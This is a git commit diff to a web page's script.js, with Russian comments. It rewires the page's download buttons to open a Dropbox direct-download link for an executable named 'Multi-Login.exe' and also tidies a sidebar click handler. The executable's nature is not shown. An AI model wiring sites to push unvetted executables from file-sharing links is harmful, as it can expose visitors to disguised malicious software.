7f88554fa39abaefb947633e7893d31bb074ff44
nevernight1337 <theneverxx52@gmail.com>
2024-10-27 21:13:39 +0300

    script.js

--- script.js
+++ script.js
@@ -2,16 +2,15 @@
 document.querySelectorAll('.download-btn').forEach(function(button) {
     button.addEventListener('click', function(e) {
         e.preventDefault();
-        // Здесь вы можете добавить функциональность для скачивания файла
-        // Например, перенаправление на страницу скачивания или запуск скачивания
-        alert('Скачивание началось!');
+        // Открытие ссылки на скачивание в новой вкладке
+        window.open('https://dl.dropboxusercontent.com/scl/fi/0tzte2g8aomaov6aj0ba0/Multi-Login.exe?rlkey=uihhsgusqvtz40mjlvu4uejr0&st=ghf3g2ii&dl=1', '_blank');
     });
 });
 
 // Опционально: Закрытие бокового меню при клике вне его
 document.addEventListener("click", function(event) {
     const sidebar = document.getElementById("sidebar");
-    if (!sidebar.contains(event.target)) {
+    if (sidebar && !sidebar.contains(event.target) && sidebar.classList.contains("active")) {
         sidebar.classList.remove("active");
     }
 });
